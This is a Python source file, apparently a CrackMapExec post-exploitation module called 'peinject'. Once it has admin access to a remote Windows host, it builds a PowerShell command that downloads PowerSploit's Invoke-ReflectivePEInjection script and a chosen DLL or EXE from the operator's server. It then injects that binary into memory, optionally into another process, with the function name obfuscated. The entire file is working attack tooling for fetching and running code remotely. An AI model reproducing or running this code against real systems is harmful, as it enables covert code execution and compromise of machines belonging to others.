from cme.helpers import gen_random_string, create_ps_command, obfs_ps_script, get_ps_script
from sys import exit
import os

class CMEModule:
    '''
        Downloads the specified DLL/EXE and injects it into memory using PowerSploit's Invoke-ReflectivePEInjection.ps1 script
        Module by @byt3bl33d3r
    '''
    name = 'peinject'

    description = "Downloads the specified DLL/EXE and injects it into memory using PowerSploit's Invoke-ReflectivePEInjection.ps1 script"

    def options(self, context, module_options):
        '''
            PATH     Path to dll/exe to inject
            PROCID   Process ID to inject into (default: current powershell process)
            EXEARGS  Arguments to pass to the executable being reflectively loaded (default: None)
        '''

        if not 'PATH' in module_options:
            context.log.error('PATH option is required!')
            exit(1)

        self.payload_path = os.path.expanduser(module_options['PATH'])
        if not os.path.exists(self.payload_path):
            context.log.error('Invalid path to EXE/DLL!')
            exit(1)

        self.procid  = None
        self.exeargs = None

        if 'PROCID' in module_options:
            self.procid = module_options['PROCID']

        if 'EXEARGS' in module_options:
            self.exeargs = module_options['EXEARGS']

        self.obfs_name = gen_random_string()

    def on_admin_login(self, context, connection):
 
        payload = """
        IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/Invoke-ReflectivePEInjection.ps1');
        $WebClient = New-Object System.Net.WebClient;
        [Byte[]]$bytes = $WebClient.DownloadData('{server}://{addr}:{port}/{pefile}');
        Invoke-{func_name} -PEBytes $bytes""".format(server=context.server,
                                                     port=context.server_port,
                                                     addr=context.localip,
                                                     func_name=self.obfs_name,
                                                     pefile=os.path.basename(self.payload_path))

        if self.procid:
            payload += ' -ProcessID {}'.format(self.procid)

        if self.exeargs:
            payload += ' -ExeArgs "{}"'.format(self.exeargs)

        context.log.debug('Payload:{}'.format(payload))
        payload = create_ps_command(payload, force_ps32=True)
        connection.execute(payload)
        context.log.success('Executed payload')

    def on_request(self, context, request):
        if 'Invoke-ReflectivePEInjection.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            with open(get_ps_script('PowerSploit/CodeExecution/Invoke-ReflectivePEInjection.ps1'), 'r') as ps_script:
                ps_script = obfs_ps_script(ps_script.read(), self.obfs_name)
                request.wfile.write(ps_script)

        elif os.path.basename(self.payload_path) == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.stop_tracking_host()

            with open(self.payload_path, 'rb') as payload:
                request.wfile.write(payload.read())

        else:
            request.send_response(404)
            request.end_headers()